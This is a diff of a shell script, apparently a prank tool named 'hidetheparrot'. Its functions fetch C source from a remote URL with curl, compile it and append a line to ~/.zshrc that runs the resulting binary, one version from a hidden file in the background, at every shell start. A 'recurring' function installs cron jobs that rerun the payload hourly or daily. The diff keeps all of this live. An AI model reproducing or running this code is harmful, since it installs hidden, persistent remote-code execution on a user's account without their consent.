@@ -62,17 +62,17 @@ function normal_donut {
 	touch ~/donut
 	curl -s https://kasderooi.github.io/hidetheparrot.xyz/donut > ~/donut.c
 	gcc ~/donut.c -o ~/donut
-	echo "echo \"bash ~/donut\" >> ~/.zshrc" > ~/.doit.sh
+	echo "echo \"~/donut\" >> ~/.zshrc" > ~/.doit.sh
 	bash ~/.doit.sh
 }
 
-function normal_donut {
+function fixed_donut {
 	touch ~/donut
 	chmod 755 ~/donut
 	curl -s https://kasderooi.github.io/hidetheparrot.xyz/donut > ~/donut.c
 	gcc ~/donut.c -o ~/.donut
-	rm ~/donut.c
-	echo "echo \"bash ~/.donut&\" >> ~/.zshrc" > ~/.doit.sh
+	#rm ~/donut.c
+	echo "echo \"~/.donut&\" >> ~/.zshrc" > ~/.doit.sh
 	bash ~/.doit.sh
 }
 
@@ -91,7 +91,6 @@ function recurring {
 		2) (crontab -l 2>/dev/null; echo "42 */1 * * * ~/.doit.sh") | crontab - ;;
 		3) (crontab -l 2>/dev/null; echo "42 11 */1 * * ~/.doit.sh") | crontab - ;;
 	esac
-	curl parrot.live
 }
 
 touch ~/.doit.sh
